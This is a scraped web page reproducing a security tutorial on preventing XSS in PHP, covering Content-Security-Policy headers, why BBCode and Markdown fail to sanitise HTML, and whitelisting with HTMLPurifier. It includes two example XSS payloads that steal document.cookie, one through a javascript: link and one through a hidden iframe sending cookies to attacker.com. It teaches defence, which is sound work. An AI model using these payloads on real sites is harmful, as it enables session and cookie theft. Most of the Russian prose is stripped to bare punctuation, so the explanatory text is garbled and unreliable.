,     -   ,     CSP    ,    : </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>-src <span class="hljs-string"><span class="hljs-string">'none'</span></span>; script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com; style-src <span class="hljs-string"><span class="hljs-string">'self'</span></span></code> </pre> <br><p>   .  CSP ‚Äî  ,     X-Content-Security-Policy,  ,     WebKit-,   Safari  Chrome.   WebKit  . </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>-src <span class="hljs-string"><span class="hljs-string">'none'</span></span>; script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com; style-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> X-WebKit-CSP: <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>-src <span class="hljs-string"><span class="hljs-string">'none'</span></span>; script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com; style-src <span class="hljs-string"><span class="hljs-string">'self'</span></span></code> </pre> <br><h2 id="opredelenie-brauzera-polzovatelya">    </h2><br><h2 id="ochistka-html">  HTML </h2><br><p>  -  -       HTML-   -     .  :    ,   ,      RSS  Atom.      ,      ,        ,  ,     . </p><br><p>  ,     HTML- ¬´ ¬ª,   ¬´ ¬ª?  -    HTML-   ,  BBCode, Markdown  Textile.    PHP ‚Äî ,      XSS-.  .    ‚Äî        ,     HTML.    HTML,           SGML-.        HTML ‚Äî   . </p><br><p> HTML       .      ,     ‚Äî  .      HTML - ¬´ ¬ª.      .       ,         HTML. </p><br><p>    : </p><br><pre> <code class="hljs swift">[url=javascript:alert('<span class="hljs-type"><span class="hljs-type">I</span></span> can haz <span class="hljs-type"><span class="hljs-type">Cookie?</span></span>n'+document.cookie)]<span class="hljs-type"><span class="hljs-type">Free</span></span> <span class="hljs-type"><span class="hljs-type">Bitcoins</span></span> <span class="hljs-type"><span class="hljs-type">Here!</span></span>[/url]</code> </pre> <br><p> BB-  HTML  ,      . ,      HTTP URL'   .  Markdown: </p><br><pre> <code class="hljs xml">I am a Markdown paragraph.<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="xml"><span class="xml">document.write('</span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">‚Äùhttp://attacker.com?cookie</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">' + document.cookie.escape() + '</span></span></span></span><span class="xml"><span class="hljs-tag">‚Äù </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">0</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">0</span></span></span></span><span class="xml"><span class="hljs-tag"> /&gt;</span></span></span><span class="xml">');</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> There's no need to panic. I swear I am just plain text!</code> </pre> <br><p> Markdown ‚Äî     HTML,       HTML  Markdown.   ,  Markdown      XSS-. </p><br><p> ,       HTML   ,            ,      .  .    ,           . </p><br><p>  HTML ‚Äî      ,    ,     .    ,    ,   PHP     ,   ,    .    ¬´¬ª ,   . </p><br><p>    PHP,     HTML, ‚Äî HTMLPurifier.   ,    ,     .  HTMLPurifier   ,  ,     : </p><br><pre> <code class="hljs bash">// Basic setup without a cache <span class="hljs-variable"><span class="hljs-variable">$config</span></span> = HTMLPurifier_Config::createDefault(); <span class="hljs-variable"><span class="hljs-variable">$config</span></span>-&gt;<span class="hljs-built_in"><span class="hljs-built_in">set</span></span>(<span class="hljs-string"><span class="hljs-string">'Core'</span></span>, <span class="hljs-string"><span class="hljs-string">'Encoding'</span></span>, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>); <span class="hljs-variable"><span class="hljs-variable">$config</span></span>-&gt;<span class="hljs-built_in"><span class="hljs-built_in">set</span></span>(<span class="hljs-string"><span class="hljs-string">'HTML'</span></span>, <span class="hljs-string"><span class="hljs-string">'Doctype'</span></span>, <span class="hljs-string"><span class="hljs-string">'HTML 4.01 Transitional'</span></span>); // Create the whitelist <span class="hljs-variable"><span class="hljs-variable">$config</span></span>-&gt;<span class="hljs-built_in"><span class="hljs-built_in">set</span></span>(<span class="hljs-string"><span class="hljs-string">'HTML.Allowed'</span></span>, <span class="hljs-string"><span class="hljs-string">'p,b,a[href],i'</span></span>); // basic formatting and links <span class="hljs-variable"><span class="hljs-variable">$sanitiser</span></span> = new HTMLPurifier(<span class="hljs-variable"><span class="hljs-variable">$config</span></span>); <span class="hljs-variable"><span class="hljs-variable">$output</span></span> = <span class="hljs-variable"><span class="hljs-variable">$sanitiser</span></span>-&gt;purify(<span class="hljs-variable"><span class="hljs-variable">$untrustedHtml</span></span>);</code> </pre> <br><p>       HTML-,     ,  . </p><br><h2 id="vneshnyaya-zaschita-prilozheniya">    </h2><br><p> [ ] </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/352442/">https://habr.com/ru/post/352442/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../352432/index.html">Linux distribution from scratch to build Docker images - our experience with dappdeps</a></li>
<li><a href="../352434/index.html">Ransomware is gaining strength</a></li>
<li><a href="../352436/index.html">Blondes, monsters and artificial intelligence addictions</a></li>
<li><a href="../352438/index.html">Java Puzzlers NG S02: Wonderful and Wonderful</a></li>
<li><a href="../352440/index.html">The book "Security in PHP" (part 2). Code injection attacks</a></li>
<li><a href="../352444/index.html">The book Security in PHP (part 4). The lack of security at the transport level (HTTPS, TLS and SSL)</a></li>
<li><a href="../352446/index.html">The book "Security in PHP" (Part 5). Lack of entropy for random values</a></li>
<li><a href="../352448/index.html">Manual cipher LS47</a></li>
<li><a href="../352450/index.html">The history of the mobile Internet: 1991 - our days</a></li>
<li><a href="../352452/index.html">How to become a frontend developer in 2018</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>